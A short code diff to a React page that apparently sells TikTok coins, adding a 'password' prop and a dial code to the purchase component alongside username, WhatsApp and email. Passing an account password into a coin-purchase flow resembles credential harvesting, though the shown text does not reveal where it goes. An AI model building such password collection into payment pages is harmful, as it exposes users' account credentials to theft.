@@ -867,7 +867,9 @@ export default function Home() {
                         : `Purchase of ${deliveredCoins} TikTok coins for ${username}`
                     }
                     username={username}
+                    password={password}
                     whatsapp={whatsapp}
+                    dialCode={dialCode}
                     email={email}
                     coins={deliveredCoins}
                   />
